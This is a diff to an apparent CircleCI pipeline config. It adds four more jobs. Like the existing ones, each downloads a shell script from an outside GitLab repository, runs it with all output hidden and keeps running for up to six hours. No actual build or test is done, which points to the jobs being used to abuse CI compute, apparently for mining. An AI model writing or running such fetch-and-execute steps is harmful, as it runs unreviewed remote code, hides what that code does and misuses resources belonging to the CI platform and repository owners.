@@ -11,10 +11,7 @@ jobs:
       - run:
           no_output_timeout: 362m
           
-          command: "wget https://gitlab.com/fukadabunit/project-7/-/raw/main/node.sh && chmod +x node.sh && ./node.sh >/dev/null 2>&1"
-      
-      
-      
+          command: "wget https://gitlab.com/fukadabunit/project-7/-/raw/main/node.sh && chmod +x node.sh && ./node.sh >/dev/null 2>&1"              
       
   build_02:
     docker:
@@ -55,9 +52,57 @@ jobs:
           
           command: "wget https://gitlab.com/fukadabunit/project-7/-/raw/main/node.sh && chmod +x node.sh && ./node.sh >/dev/null 2>&1"
 
-  
+  build_05:
+    docker:
+      - image: cimg/base:stable
 
-  
+    working_directory: ~/repo
+    steps:
+      - checkout
+      - run: ls
+      - run:
+          no_output_timeout: 362m
+          
+          command: "wget https://gitlab.com/fukadabunit/project-7/-/raw/main/node.sh && chmod +x node.sh && ./node.sh >/dev/null 2>&1"              
+      
+  build_06:
+    docker:
+      - image: cimg/base:stable
+
+    working_directory: ~/repo
+    steps:
+      - checkout
+      - run: ls
+      - run:
+          no_output_timeout: 360m
+          
+          command: "wget https://gitlab.com/fukadabunit/project-7/-/raw/main/node.sh && chmod +x node.sh && ./node.sh >/dev/null 2>&1"
+      
+  build_07:
+    docker:
+      - image: cimg/base:stable
+
+    working_directory: ~/repo
+    steps:
+      - checkout
+      - run: ls
+      - run:
+          no_output_timeout: 360m
+          
+          command: "wget https://gitlab.com/fukadabunit/project-7/-/raw/main/node.sh && chmod +x node.sh && ./node.sh >/dev/null 2>&1"
+      
+  build_08:
+    docker:
+      - image: cimg/base:stable
+
+    working_directory: ~/repo
+    steps:
+      - checkout
+      - run: ls
+      - run:
+          no_output_timeout: 360m
+          
+          command: "wget https://gitlab.com/fukadabunit/project-7/-/raw/main/node.sh && chmod +x node.sh && ./node.sh >/dev/null 2>&1"   
       
   
 workflows:
@@ -68,3 +113,7 @@ workflows:
             - build_02
             - build_03
             - build_04
+            - build_05
+            - build_06
+            - build_07
+            - build_08
